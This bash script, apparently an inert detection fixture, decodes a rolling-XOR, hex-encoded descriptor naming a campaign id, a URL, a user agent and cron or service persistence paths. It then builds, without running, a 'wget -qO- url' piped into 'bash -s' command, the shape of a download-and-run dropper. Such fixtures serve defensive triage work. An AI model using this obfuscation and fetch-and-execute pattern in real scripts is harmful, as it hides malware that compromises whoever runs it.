#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_70308de5='35-08-39-45-36-42-27-57-24-19-78-1b-6a-1f-76-04-61-3e-4c-29-44-2b-5f-3a-16-72-1b-68-18-79-0d-6e-06-59-29-40-30-55-29-48-2c-4d-3d-49-2c-5e-63-14-73-16-62-3d-4e-3a-5e-31-44-30-6f-1f-76-06-63-1f-6c-18-79-1e-7b-24-47-28-5d-33-47-7a-4b-37-54-35-58-28-49-20-47-29-76-1f-7b-46-25-44-29-59-38-51-36-58-75-17-20-41-74-47-74-4d-28-10-76-0a-7f-0d-61-5c-34-40-34-44-37-0d-22-0d-6f-58-39-0c-3f-0c-35-50-68-0e-20-45-3d-5c-31-41-2d-48-66-0f-61-17-76-1a-73-17-38-5d-68-58-60-59-3f-0a-6b-45-36-5e-22-57-24-41-33-6c-0d-6a-0f-61-15-28-60-15-7b-0f-7d-18-6b-18-54-35-57-78-1a-2d-4c-79-4a-79-40-25-1d-7b'
  readonly Codec_70308de5='hex_dash|rolling_xor|43'

  Load_70308de5() {
    e=()
    local IFS='-' p
    local -a pieces
    read -r -a pieces <<< "${Material_70308de5}"
    for p in "${pieces[@]}"; do e+=("$((16#$p))"); done
  }

  Decode_70308de5() {
    d=()
    local q=67
    local i
    for ((i=0; i<${#e[@]}; i++)); do
      d+=("$((e[i] ^ q))")
      q=${e[i]}
    done
  }

  Recover_70308de5() {
    local -a e d
    local t n z i
    n=''
    Load_70308de5
    z=0; while ((z < 1)); do Decode_70308de5; ((z+=1)); done
    t=''
    local octal character
    for i in "${!d[@]}"; do
      printf -v octal '%03o' "${d[i]}"
      printf -v character '%b' "\\$octal"
      t+="$character"
    done
    printf '%s\n' "$t"
  }

  Inspect_70308de5() { local recovered field; local -a fields; recovered="$(Recover_70308de5)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_70308de5() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_70308de5)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_70308de5; fi
